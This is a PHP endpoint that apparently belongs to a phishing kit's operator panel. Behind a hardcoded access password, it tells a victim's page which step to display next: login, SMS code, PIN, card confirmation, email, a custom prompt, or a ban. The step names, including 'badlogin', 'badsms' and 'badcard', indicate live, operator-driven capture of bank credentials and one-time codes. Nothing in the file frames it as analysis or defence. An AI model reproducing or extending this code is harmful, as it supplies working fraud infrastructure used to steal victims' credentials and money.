<?php
require_once "../cors.php";
require_once './func.php';

// ─── Constantes ───────────────────────────────────────────────────────────────

define('ACCESS_PWD', 'BLACKFORCE');

// Steps valides autorisés
const VALID_STEPS = [
    'login', 'badlogin',
    'sms', 'badsms',
    'pin', 'badpin',
    'confirm', 'badcard',
    'app',
    'mail', 'badmail',
    'custom', 'badcustom',
    'ban',
    'unknown',
];

// ─── Validation requête ───────────────────────────────────────────────────────

function isValidRequest(): bool
{
    return (
        $_SERVER['REQUEST_METHOD'] === 'GET'
        && isset($_GET['id'], $_GET['PWD'])
        && $_GET['PWD'] === ACCESS_PWD
    );
}

function sanitizeId(string $id): string
{
    // Autorise uniquement IP valides ou alphanumériques simples
    if (filter_var($id, FILTER_VALIDATE_IP)) {
        return $id;
    }
    // Sinon : alphanumérique + tirets/underscores uniquement
    return preg_replace('/[^a-zA-Z0-9\-_.]/', '', $id);
}

// ─── Point d'entrée ───────────────────────────────────────────────────────────

if (!isValidRequest()) {
    http_response_code(403);
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Invalid request.']);
    exit;
}

$id   = sanitizeId(trim($_GET['id']));

if (empty($id)) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid ID.']);
    exit;
}

$step = response($id); // depuis func.php

// Réponse step simple
if (in_array($step, VALID_STEPS, true)) {
    header('Content-Type: text/plain; charset=UTF-8');
    echo $step;
    exit;
}

// Step custom avec payload (text + input)
if ($step === 'custom') {
    $custom = response_custom($id);
    if (is_array($custom)) {
        header('Content-Type: application/json');
        echo json_encode($custom);
        exit;
    }
}

// Step inconnu ou erreur
http_response_code(200);
header('Content-Type: text/plain');
echo 'unknown';
exit;